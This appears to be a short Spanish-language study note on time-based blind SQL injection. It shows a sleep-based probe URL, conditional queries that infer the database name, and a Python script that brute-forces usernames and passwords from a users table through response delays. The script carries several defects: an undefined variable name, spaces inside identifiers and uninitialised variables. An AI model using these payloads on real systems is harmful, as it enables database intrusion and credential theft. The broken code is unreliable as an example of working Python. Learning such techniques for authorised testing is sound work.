-----
Tags: #timesqli

---------
Si con la siguiente sentencia, el servidor tarda 5 segundos en tramitar la respuesta, significa que es muy posible que sea vulnerable a time sqli.
```url
http://localhost/searchUsers.php?id=1 and sleep(5)
```

Si esta sentencia es correcta, el servidor tardará el tiempo del sleep.
```sql
select * from users where id = 1 and if(substr(database(),1,1)='h', sleep(5), 1);
select * from users where id = 1 and if(ascii(substr(database(),1,1))='68', sleep(5), 1);
```

Realizamos un script en python para explotar la vulnerabilidad anterior (ebemos instalar la libreria pwn con pip3).
```python
import requests;import signal;import sys;import time;import string
from pwn import *

def def_handler(sig, frame):
	print("\n\n[!] Saliendo... \n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():
	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")
	
	for position in range(1, 150):
		for character in range(33, 126):
			sqli_url = main_uri + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users), %d, 1))=%d, sleep(0.35), 1)" % (position, character)
		
			p1.status(sqli _url)
			time start = time.time()
			r = requests.get(sqli_url)
			time end = time.time()

			if time_end - time_start > 0.35:
				extracted_info += chr(character)
				p2.status(extracted_info)
				break

if __name__ == '__main__':
	makeSQLI()
```